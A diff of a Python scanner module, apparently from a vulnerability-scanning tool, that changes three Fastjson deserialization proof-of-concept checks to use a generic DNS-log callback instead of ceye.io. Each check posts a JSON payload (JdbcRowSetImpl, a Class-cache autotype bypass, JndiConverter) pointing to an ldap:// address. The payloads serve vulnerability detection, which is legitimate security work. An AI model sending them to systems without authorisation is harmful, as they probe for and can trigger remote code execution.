@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import json
-import requests
+from thirdparty import requests
 import threading
 from core.verify import verify
 from module import globals
-from module.md5 import random_md5
-from requests.packages import urllib3
-from requests_toolbelt.utils import dump
-urllib3.disable_warnings()
+from thirdparty.requests_toolbelt.utils import dump
+from module.api.dns import dns_result, dns_request
 
 
 class Fastjson():
@@ -19,9 +17,6 @@ class Fastjson():
         self.ua = globals.get_value("UA")  # 获取全局变量UA
         self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
         self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
-        self.ceye_domain = globals.get_value("ceye_domain")
-        self.ceye_token = globals.get_value("ceye_token")
-        self.ceye_api = globals.get_value("ceye_api")
         self.threadLock = threading.Lock()
 
     def fastjson_1224_poc(self):
@@ -42,9 +37,9 @@ class Fastjson():
         self.vul_info["vul_desc"] = "Fastjson中的parseObject允许远程攻击者通过精心制作的JSON请求执行任意代码"
         self.vul_info["cre_date"] = "2021-01-20"
         self.vul_info["cre_auth"] = "zhzyker"
-        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
-        md = random_md5()
-        dns = md + "." + self.ceye_domain
+        headers = {'User-Agent': self.ua, 'Content-Type': "application/json", 'Connection': 'close'}
+        md = dns_request()
+        dns = md
         data = {
             "b": {
                 "@type": "com.sun.rowset.JdbcRowSetImpl",
@@ -54,13 +49,15 @@ class Fastjson():
         }
         data = json.dumps(data)
         try:
-            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
-            req = requests.get(self.ceye_api + self.ceye_token)
-            if md in req.text:
+            try:
+                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                 self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
+            except:
+                pass
+            if dns_result(md):
                 self.vul_info["vul_payd"] = "ldap://" + dns + "//Exploit] "
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["prt_info"] = "[ceye] [payload: ldap://"+dns+"//Exploit] "
+                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                 verify.scan_print(self.vul_info)
             else:
                 verify.scan_print(self.vul_info)
@@ -90,9 +87,9 @@ class Fastjson():
         self.vul_info["vul_desc"] = "Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。"
         self.vul_info["cre_date"] = "2021-01-20"
         self.vul_info["cre_auth"] = "zhzyker"
-        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
-        md = random_md5()
-        dns = md + "." + self.ceye_domain
+        headers = {'User-Agent': self.ua, 'Content-Type': "application/json", 'Connection': 'close'}
+        md = dns_request()
+        dns = md
         data = {
             "a": {
                 "@type": "java.lang.Class",
@@ -106,13 +103,15 @@ class Fastjson():
         }
         data = json.dumps(data)
         try:
-            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
-            req = requests.get(self.ceye_api + self.ceye_token)
-            if md in req.text:
+            try:
+                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                 self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
+            except:
+                pass
+            if dns_result(md):
                 self.vul_info["vul_payd"] = "ldap://"+dns+"//Exploit] "
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["prt_info"] = "[ceye] [payload: ldap://"+dns+"//Exploit] "
+                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                 verify.scan_print(self.vul_info)
             else:
                 verify.scan_print(self.vul_info)
@@ -144,21 +143,23 @@ class Fastjson():
         self.vul_info["cre_date"] = "2021-01-21"
         self.vul_info["cre_auth"] = "zhzyker"
         headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
-        md = random_md5()
-        dns = md + "." + self.ceye_domain
+        md = dns_request()
+        dns = md
         data = {
             "@type": "org.apache.xbean.propertyeditor.JndiConverter",
             "AsText": "ldap://" + dns + "//exploit"
         }
         data = json.dumps(data)
         try:
-            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
-            req = requests.get(self.ceye_api + self.ceye_token)
-            if md in req.text:
+            try:
+                request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
                 self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
+            except:
+                pass
+            if dns_result(md):
                 self.vul_info["vul_payd"] = "ldap://" + dns + "//Exploit] "
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["prt_info"] = "[ceye] [payload: ldap://"+dns+"//Exploit] "
+                self.vul_info["prt_info"] = "[dns] [payload: ldap://"+dns+"//Exploit] "
                 verify.scan_print(self.vul_info)
             else:
                 verify.scan_print(self.vul_info)
